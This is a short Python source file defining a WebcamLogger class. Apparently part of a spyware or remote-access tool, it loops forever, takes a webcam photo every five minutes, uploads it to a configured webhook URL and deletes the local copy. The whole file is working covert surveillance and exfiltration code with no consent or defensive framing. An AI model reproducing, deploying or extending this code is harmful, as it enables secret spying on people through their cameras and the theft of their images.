from utils import *

import time
import os
import cv2

class WebcamLogger:
    def __init__(self, software_dir_name, webhook_url):
        self.software_dir_name = software_dir_name
        self.webhook_url = webhook_url
        self.log_file = os.path.join(get_logs_path(self.software_dir_name), "webcam_log.png")
        self.interval = 300
    
    def log_webcam(self):
        try:
            cam = cv2.VideoCapture(0)
            time.sleep(2)
            ret, frame = cam.read()
            if not ret:
                return
            cv2.imwrite(self.log_file, frame)
            cam.release()
            send_webhook(self.webhook_url, file={"webcam_logs.png": open(self.log_file, "rb")})
            os.remove(self.log_file)
        except Exception as e:
            send_webhook(self.webhook_url, f"```❌ Error logging webcam: {e}```")

    def start(self):
        while True:
            self.log_webcam()
            time.sleep(self.interval)
